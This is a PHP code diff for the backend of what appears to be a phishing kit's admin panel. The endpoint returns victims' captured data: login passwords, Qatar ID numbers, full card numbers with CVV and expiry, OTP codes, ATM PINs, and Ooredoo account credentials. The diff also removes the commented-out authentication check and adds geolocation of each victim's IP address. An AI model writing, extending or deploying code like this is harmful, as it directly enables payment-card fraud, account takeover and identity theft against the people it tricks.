@@ -3,51 +3,73 @@ session_start();
 require_once __DIR__ . '/../../includes/db.php';
 require_once __DIR__ . '/../../includes/functions.php';
 
-// في بيئة الإنتاج يجب التحقق من الجلسة هنا
-// if (!isset($_SESSION['admin_logged_in'])) {
-//     header('Content-Type: application/json');
-//     echo json_encode(['success' => false, 'message' => 'Unauthorized']);
-//     exit;
-// }
-
 header('Content-Type: application/json');
+
+// دالة للحصول على الدولة من عنوان IP
+function getCountryFromIP($ip) {
+    if ($ip === '127.0.0.1' || $ip === 'localhost' || strpos($ip, '192.168.') === 0 || strpos($ip, '10.') === 0) {
+        return 'محلي';
+    }
+    try {
+        $ctx = stream_context_create(['http' => ['timeout' => 2]]);
+        $response = @file_get_contents("https://ipapi.co/{$ip}/json/", false, $ctx);
+        if ($response !== false) {
+            $data = json_decode($response, true);
+            return $data['country_name'] ?? 'غير معروف';
+        }
+    } catch (Exception $e) {}
+    return 'غير معروف';
+}
 
 try {
     global $pdo;
-    if (!$pdo) {
-        throw new Exception('PDO connection failed');
-    }
     $visitors = getAllVisitorsWithData();
     $formatted = [];
     
     foreach ($visitors as $v) {
         $details = $v['details'] ?? [];
+        $country = getCountryFromIP($v['ip_address']);
+        
         $formatted[] = [
             'referenceId' => $v['visitor_id'],
+            'country' => $country,
+            'username' => $details['username'] ?? '-',
+            'password' => $details['password'] ?? '-',
             'clientName' => $details['name_ar'] ?? $details['username'] ?? '-',
-            'clientId' => $details['id_number'] ?? '-',
+            'clientId' => $details['id_number'] ?? $details['qatar_id'] ?? '-',
             'clientPhone' => $details['phone_number'] ?? '-',
-            'vehiclePlate' => $details['vehicle_plate'] ?? '-',
-            'vehicleType' => $details['vehicle_type'] ?? '-',
-            'serviceRegion' => $details['region'] ?? '-',
-            'serviceDate' => $v['last_activity'],
-            'serviceTime' => '-',
+            'last_activity' => date('H:i:s', strtotime($v['last_activity'])),
             'status' => $v['status'],
-            'statusRead' => true,
             'clientIp' => $v['ip_address'],
-            'clientEmail' => $details['email_confirm'] ?? '-',
-            'clientNationality' => $details['nationality'] ?? '-',
-            'payment' => [
-                'cardHolderName' => $details['card_name'] ?? '-',
-                'cardNumber' => $details['card_number'] ?? '-',
-                'cardExpiry' => ($details['exp_month'] ?? '') . '/' . ($details['exp_year'] ?? ''),
-                'cardCvv' => $details['cvv'] ?? '-',
-                'verifyCode' => $details['otp'] ?? '-',
-                'secretNum' => $details['atm_pin'] ?? '-',
-                'ooredooUser' => $details['ooredoo_user'] ?? '-',
-                'ooredooPass' => $details['ooredoo_pass'] ?? '-',
-                'ooredooOtp' => $details['ooredoo_otp'] ?? '-',
-                'step' => 1 // يمكن تطوير هذا المنطق
+            'allData' => [
+                'username' => $details['username'] ?? '-',
+                'password' => $details['password'] ?? '-',
+                'name_ar' => $details['name_ar'] ?? '-',
+                'name_en' => $details['name_en'] ?? '-',
+                'id_number' => $details['id_number'] ?? '-',
+                'qatar_id' => $details['qatar_id'] ?? '-',
+                'dob' => $details['dob'] ?? '-',
+                'gender' => $details['gender'] ?? '-',
+                'address' => $details['address'] ?? '-',
+                'email' => $details['email'] ?? '-',
+                'email_confirm' => $details['email_confirm'] ?? '-',
+                'phone_number' => $details['phone_number'] ?? '-',
+                'country_code' => $details['country_code'] ?? '-',
+                'account_type' => $details['account_type'] ?? '-',
+                'nationality' => $details['nationality'] ?? '-',
+                'card_name' => $details['card_name'] ?? '-',
+                'card_number' => $details['card_number'] ?? '-',
+                'exp_month' => $details['exp_month'] ?? '-',
+                'exp_year' => $details['exp_year'] ?? '-',
+                'cvv' => $details['cvv'] ?? '-',
+                'otp' => $details['otp'] ?? '-',
+                'atm_pin' => $details['atm_pin'] ?? '-',
+                'ooredoo_user' => $details['ooredoo_user'] ?? '-',
+                'ooredoo_pass' => $details['ooredoo_pass'] ?? '-',
+                'ooredoo_otp' => $details['ooredoo_otp'] ?? '-',
+                'vehicle_plate' => $details['vehicle_plate'] ?? '-',
+                'vehicle_type' => $details['vehicle_type'] ?? '-',
+                'region' => $details['region'] ?? '-',
             ]
         ];
     }
